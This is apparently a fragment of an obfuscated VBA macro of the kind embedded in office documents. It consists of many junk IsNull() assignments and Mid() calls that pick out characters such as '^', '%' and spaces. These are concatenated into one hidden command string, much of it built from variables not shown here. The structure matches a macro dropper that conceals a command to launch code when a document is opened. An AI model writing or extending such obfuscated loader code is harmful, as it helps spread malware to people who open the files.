wGCMXnP = IsNull("joIAwLJBZzwkF") + IsNull("XtDIwERnb") + IsNull("oKocjspzFQSD") + IsNull("rOIjAGRzbzth") + IsNull("sdbIXtMYM") + IsNull("XjRjKBipwUNMt") + IsNull("XRhJmMKuvTAMW")
LutkLUKHQ = Mid("HvRVFqPCweuq", 9, 2)
aRLXUm = IsNull("uUIMpiDUzK") + IsNull("OrZBnczQWMEARI") + IsNull("avWdJAhpXuFJ") + IsNull("QuviCXpJWhoBGS") + IsNull("IpUrECIHwUBwj") + IsNull("CHhSDAb") + IsNull("WwtSdENic")
hCLBbwKQSD = IsNull("smVraYZLYdcCSF") + IsNull("wwCHjGdEttnvl") + IsNull("uMoklvpYIoIP") + IsNull("fmrPlns") + IsNull("EGNGtOibzm") + IsNull("nZiRoShKzap") + IsNull("zQDwRBiBH")
VQrCNGq = IsNull("hthhZNF") + IsNull("HnzOBZIHTZGiC") + IsNull("MsTVzlZDt") + IsNull("swQnVUhUN") + IsNull("soSHzUJW") + IsNull("nbtzOjpODPTS") + IsNull("thVCIVm")
wiECKhnkOfQ = Mid("hqZtGEnNtaoSpzAoOwlzwcEoimERY  EjMFzTOrH", 30, 2)
HdrlVoz = IsNull("OpGaishHwLBfc") + IsNull("AVDwEdtzPsO") + IsNull("qPQZTkVuLpKNo") + IsNull("csddMTnawwwhz") + IsNull("zRaOMoCRqWs") + IsNull("JhRKKpHPB") + IsNull("TljuBPR")
zkWdEXAbuJ = IsNull("odvXCqaVwE") + IsNull("cfUCVTrbVlIztA") + IsNull("zMlSBXVoqhi") + IsNull("qdLWaPYcHihTdq") + IsNull("JkfjCWYsN") + IsNull("jCWGriVmZAzK") + IsNull("ihUYVSiRo")
SvjNj = IsNull("blnsvuPwBA") + IsNull("LBGlvKGInmJZ") + IsNull("cwzohRmmAWvH") + IsNull("RmXvNoHcqzN") + IsNull("kkvHdhRLFPwwaO") + IsNull("NAKfKiRsTlrY") + IsNull("SEmzkpwhqf")
iXnhl = Mid("AjttzCiYIzsWIpoYBKRz", 14, 1)
hzJDVDK = IsNull("HLDKAfWR") + IsNull("zmtNBVPAMjDp") + IsNull("zVzzhwCai") + IsNull("rrPvoTUHC") + IsNull("MMdoUTCGRRkk") + IsNull("qMiNAwYOKP") + IsNull("CVmabhsZA")
GjMYwObi = IsNull("AuNiiiIi") + IsNull("CJAdHMXwafGYa") + IsNull("UkCsIikNjIOqd") + IsNull("aEcGTJWs") + IsNull("WqMUzsG") + IsNull("lZCtujq") + IsNull("DEodrPQ")
oMwzSEKSw = IsNull("EnrIfOv") + IsNull("IQiHUYjFGTJiUC") + IsNull("KmwhcikZKjQlYq") + IsNull("VjcSBwk") + IsNull("BNqVaYQWmCqhWh") + IsNull("SRYrXXEnKPCw") + IsNull("CCAwZrwTmJ")
lZcPAz = Mid("zQjOGrKTOw whGNsGijhHESOKYEMWzpGWU", 11, 3)
lfGhrPVZpYU = IsNull("OWWDzERUbijB") + IsNull("KkVaFdQaPjXmGQ") + IsNull("hOKHadF") + IsNull("WCDjIiRLAoE") + IsNull("TTClmzIwqwRto") + IsNull("mMXYbSEH") + IsNull("XCwIszUXzBXlOM")
vRjEsjN = IsNull("TJYSsrEdUad") + IsNull("anrYYZshwpwuC") + IsNull("zaRjorXqlfwuz") + IsNull("nRYQHsrVwGKDqT") + IsNull("dLiPEudLklmQ") + IsNull("CMZdctthQhnJ") + IsNull("ccLYkBEIHTUfsD")
kKNUjQEznAN = IsNull("UaUGmXlKsz") + IsNull("FnbNmoMVijprPB") + IsNull("bTsRZYAzDA") + IsNull("zUamsELzsjwkOi") + IsNull("shpfiFFQwS") + IsNull("aXWEoXMpq") + IsNull("usrljSIpiidiA")
zklHzjvG = Mid("IbsiGcSY^hVPPmtPo", 9, 1)
ofGYLCqZPm = IsNull("FnfUcGSl") + IsNull("hbzZANdqFJSB") + IsNull("LAkMbus") + IsNull("wkpjbcB") + IsNull("hoJqirJEi") + IsNull("uqdZjkIF") + IsNull("fkPfYtcirHq")
MfLjZcPz = IsNull("micmriikwN") + IsNull("BzbvXhYI") + IsNull("wDCjQzOTn") + IsNull("jCfmEXnPsWL") + IsNull("OLHRLwoWBS") + IsNull("GaictVuTLwS") + IsNull("EVNWXkRjmEbo")
XIoomsEAX = IsNull("kbYXUJLVUr") + IsNull("hSACaYBFaWAW") + IsNull("SJkzCJRznjJO") + IsNull("COazjIo") + IsNull("hMXqBJq") + IsNull("QCkFqFL") + IsNull("OSKZjuiroV")
ArzaKwiRi = Mid("FHVNupztOkpKsTcc% sH", 16, 3)
DWPzRqcijsW = IsNull("bzmPfRcOWZMVv") + IsNull("uwCzXwfDvwbQlj") + IsNull("tBwulRWIDffp") + IsNull("hwABcqXhj") + IsNull("EsLYDoo") + IsNull("fsbdYOaJc") + IsNull("pwUsGMWzzZ")
ACCwT = IsNull("jUbdjdf") + IsNull("GCUKtOlHH") + IsNull("ssiObtCidswkD") + IsNull("qYjOpwGkz") + IsNull("jOvIpjjvclBd") + IsNull("SsiaBzmTW") + IsNull("BUUiXSJmHuwiMw")
wRjKqiR = IsNull("vLEKzuCasSUPQ") + IsNull("wqDYmaT") + IsNull("zskkLlwCE") + IsNull("ObjjXTaUYijFV") + IsNull("DrJVSbLwUhMM") + IsNull("MiQbqNdBpQ") + IsNull("TjzSCkitW")
WOJzjAwtOtw = Mid("nKKGQvEjLjYcbrovCBidYt", 19, 2)
niUAAu = IsNull("suMBHSQMGNVGX") + IsNull("kKSMPto") + IsNull("BIcTwtjVnf") + IsNull("hIFaROjlIOUC") + IsNull("lhXjiSzE") + IsNull("XtDYnTX") + IsNull("kZpWpwikAzi")
XWzUuMBr = IsNull("lqEzjYZ") + IsNull("VzsBXobCiTWX") + IsNull("dCnHIsUmWBM") + IsNull("zrvpfCHDOtEb") + IsNull("hiXYHBnpZHoQ") + IsNull("bfFzwwjUYzfMz") + IsNull("OTOkwMaaN")
aZLAjHNvj = IsNull("jGjGRhQW") + IsNull("rVifdkLXsbMOfd") + IsNull("MowkszdUOwYRMw") + IsNull("FCAdsEHr") + IsNull("MTNHWWuB") + IsNull("lucljdAOBTj") + IsNull("TwalVJN")
WrvvsWpikN = Mid("mVXSlrNUCz  tVBtPkIqKZjhijTC", 11, 2)
fRKaqo = IsNull("OPzYrZkHYqbbwO") + IsNull("IvMJhsLIkYVKXp") + IsNull("OASJkjz") + IsNull("dwMYnIpm") + IsNull("zpqRORjEDH") + IsNull("AVONRUbaJ") + IsNull("iLKoiKUTXzumA")
GsoiDYX = IsNull("fqYaqoE") + IsNull("OawXFNz") + IsNull("uPNonvAWT") + IsNull("HEVQKROQ") + IsNull("kwaiaokRttNAKH") + IsNull("ifpHRjpBHijA") + IsNull("wQfJpPMRUkmA")
wvwUs = IsNull("hzmAjlFh") + IsNull("iGIjzHShPch") + IsNull("dfdfGLkfIT") + IsNull("VDfRharYj") + IsNull("jchabVMERfJSpE") + IsNull("JVdaUBUOsm") + IsNull("UplGYEzZuCv")
rjcsIMjX = Mid("WCrPtAzClaOwtuDk jzwVuGXjINZoinLSGHSPzh", 17, 1)
tCMmjncsYCQ = IsNull("iHdGLwz") + IsNull("mibGwOvvTztn") + IsNull("TcODKuu") + IsNull("KuDGOFhYA") + IsNull("kCuLlDCrB") + IsNull("WAlsMzKiO") + IsNull("ACDUckY")
cYdism = IsNull("ZZARZQzmdtnN") + IsNull("HpHfzWEUHAfqW") + IsNull("mvWuGYbCMiFQ") + IsNull("AZXfHONUd") + IsNull("LTjrRSYUb") + IsNull("iKrHzho") + IsNull("FdYZjGDvj")
SFtbczwWiV = IsNull("jJNWSjJ") + IsNull("IHrLATtcuJJK") + IsNull("PuDJwSizajBiCH") + IsNull("DAhEibqDnDCjI") + IsNull("ZSbNFUOKMUN") + IsNull("liXqjzMBZub") + IsNull("bTZrQGw")
PhkzXbh = Mid("UwmEOoLwFXqGnWsCinwZrVLjuiucsGhXSzGN", 2, 2)
laizzq = IsNull("YbJRIdKbXj") + IsNull("knNiNlqh") + IsNull("jaawPAsmm") + IsNull("oWiDwztMBOw") + IsNull("JHEVqLvTVN") + IsNull("TozBKBIkY") + IsNull("usoBjQiTYoTTI")
YnvtsCnC = IsNull("zjjmbjPidDF") + IsNull("jhkjwPH") + IsNull("cNQZjAR") + IsNull("KBQEMaCvu") + IsNull("LqEcZLHdl") + IsNull("jWzKjKwlSGCb") + IsNull("wXbnBuFip")
YvoSK = IsNull("SuuJhqSHb") + IsNull("OPwwjKsd") + IsNull("jOPPTGuQzw") + IsNull("tAfhjPHzDh") + IsNull("nQfnTSjkNv") + IsNull("uZBCfbDnaTLCO") + IsNull("kROTDtZqN")
mMCOZm = Mid("wknHqqOfLsDj", 5, 1)
RRzzjM = IsNull("fEQwznFRGPkh") + IsNull("DGVBbRcoNkZFF") + IsNull("XGjfDtlRGSMzzN") + IsNull("wLhRkXhjsiNNw") + IsNull("TqtupiLWk") + IsNull("nCmACobTPAQ") + IsNull("rnVaqZqBqj")
vwkmRbz = IsNull("ZiqsktXWpVzI") + IsNull("RzjvGflUqprET") + IsNull("VSlvUQvUE") + IsNull("BHSAwJw") + IsNull("ZpRQsQqc") + IsNull("RitwoQfB") + IsNull("DZcsvzt")
ANYzhBrPQp = IsNull("zmcSFIicabBih") + IsNull("hiDCtzwBuwFY") + IsNull("rlfjpGOmN") + IsNull("WWLkXqwqJnp") + IsNull("vmwwjrzs") + IsNull("NjtmqusLXTw") + IsNull("DhfiNZLwIw")
FtAStz = Mid("YfwIdJDbBNHdYIzG", 12, 1)
wcpPR = IsNull("uwNkXhrkfdw") + IsNull("ZVFsFdl") + IsNull("CNrmwsGY") + IsNull("juTWMVsOatB") + IsNull("NIniwih") + IsNull("jmRLidjHam") + IsNull("bSGwjdiNzNi")
PGlZAwBmZt = IsNull("zkSnWiO") + IsNull("MQCHjCXtV") + IsNull("RVQKoikz") + IsNull("ZmWnDlpDOXIUTb") + IsNull("jPJmjitKcL") + IsNull("bpmvjCZ") + IsNull("pcpdzVrzIWNr")
HGDwG = IsNull("jkHoEDECNYE") + IsNull("udHnipknoPZjHJ") + IsNull("FNRhGFG") + IsNull("bbobDWjRCOKE") + IsNull("VviKcqr") + IsNull("KYhvAzpvrz") + IsNull("nvjMtNhREzXVw")
mEwikiFE = Mid("kdUCOa YbOHrQAAdW", 7, 1)
EUjERI = IsNull("tsbZYzQQfbubzK") + IsNull("QTnFukl") + IsNull("tlKRpfloPUFhwK") + IsNull("KEJSJAuCAK") + IsNull("ioiHzNIwinOjb") + IsNull("unfGtdDFzcBk") + IsNull("bvwjJGwww")
dqNKbohDDq = KFzmjDkiqvr + QFmDHj + ApTYlTMSPzD + hQKrLo + qZVoIZ + aILKukOTuDT + QSchPZoU + WOJzjAwtOtw + wJJzqv + cVwzSjz + cnTHicpsK + CpWLrZwWj + LutkLUKHQ + zIzcoAb + PhkzXbh + wUacjkfZqs + LFEzRVU + lZcPAz + mMCOZm + irwHPKKGNmT + jJRhwWBhmi + FtAStz + nwPSB + rQjFUwDznM + ibhPWB + zwVwwXYzj + cIwPnJtsw + Uiwpq + zklHzjvG + iXnhl + CqjPm + zGXMENTM + ArzaKwiRi + sDSWOq + adFfjYtnMbF + dJfnwkL + ijHtWQzGLCI + RscakFCFbb + anKlfDlp + WrvvsWpikN + kFwEDwtMX + mEwikiFE + rjcsIMjX + PcAJjtC + sBikwDv + wiECKhnkOfQ + mjDZVbwJ
GIXsYAciw = ("iiPNPvHhnc" + "FFMwjAjDFZdow" + "XjBECdPjcCjM" + "joCYKTFACLwr" + "sirwFtRjrLFckz" + "YdJNUSAPCAS") + ("sjVYFMDkkp" + "zpuBrcwwZTd" + "YBiXjsPozmY" + "AWnAQhOqjw" + "XZRImFEs" + "OEwXWpW")
rVBjKRVBV = ("vfsFmtaoLzPkc" + "stWJwaQibLWV" + "SBFDPnzKZAwb" + "WiKrGHsS" + "QuLFvZQEhiRLI" + "GtAwfYTtailDh") + ("jEPdPdkKsJ" + "YtUTOKzOuEwGL" + "uVXUdUrrw" + "cToviDvBqE" + "fwaMXlpm" + "lwDPVINqO")
pAjzzquWE = ("rIwPGGPWwIGj" + "EfjdPYZ" + "pFnBEahwkR" + "jFvHoiz" + "GlQiHGwc" + "PMfziOBDJ") + ("CfhXMqFCv" + "YuvRPTjZ" + "fvFwQjXlDC" + "tEfUvdZOErCDC" + "tUROiKicf" + "TwhQopEBzEP")
TPaWltVUf = ("rCfXOFXUrNQ" + "CBwwIZPmBD" + "DZFrrzQIHAAbuC" + "ZjhjIqwuMZXpl" + "FtbnDbzJOfXaFJ" + "BZEtPAfFUv") + ("EisRTIfM" + "GZoqavQ" + "BJhlpWLATv" + "vZoGsvWSQw" + "OusGRblN" + "UjKDKNWPI")
hRANKRcSS = ("uDcAYpumtiEjPF" + "AMPkwiZHKjf" + "BjaizJpT" + "sjmNQadjE" + "CulKFNhWRVwRQs" + "sDSEFaZmMHd") + ("XjDwaGldRQY" + "RRmXwTaSuj" + "XKbzXcHYDc" + "KqNZVLfPNciz" + "nnBosjKioIflw" + "OBJrVtjH")
wJYwOmfVv = ("NoLkaTjWRBWhi" + "WEQODkIDGjqsP" + "RXDSNmYKviaqLz" + "ikOblbKWQRL" + "JhitiDlEtwEU" + "PMImnNYIbcvbQi") + ("HBmACBOcQ" + "smZvijjufVPB" + "dEmchFjRRZTw" + "LDRuAjsCvbwNs" + "PhkIDGSJwPZjXh" + "aNGwrUccl")
UjJhicnOp = ("TkhQPqZC" + "CVULKjUN" + "PBcmEznWzlaTb" + "rPOitwqI" + "RVaPAVwzN" + "vznjjjhct") + ("obnaKdwwBbQBH" + "KRijnBwnNEjL" + "ihCLUzP" + "phAEXYCwlwu" + "EWPBzpruAOjuw" + "OPzQwDrEUk")
ifQcwqbGl = ("wMRANfFUdb" + "FGzKnzVBqAzBfX" + "ZOwKncIfa" + "zwCRwXb" + "mYZSSIsFFvTzKm" + "vFqVSoVzaXI") + ("wTjrcYHtztGwp" + "hXMLbqLWG" + "HCJFQawu" + "TtlVDrbD" + "cBwufAGzkPwRd" + "MYkaOCcZvMn")
End Function
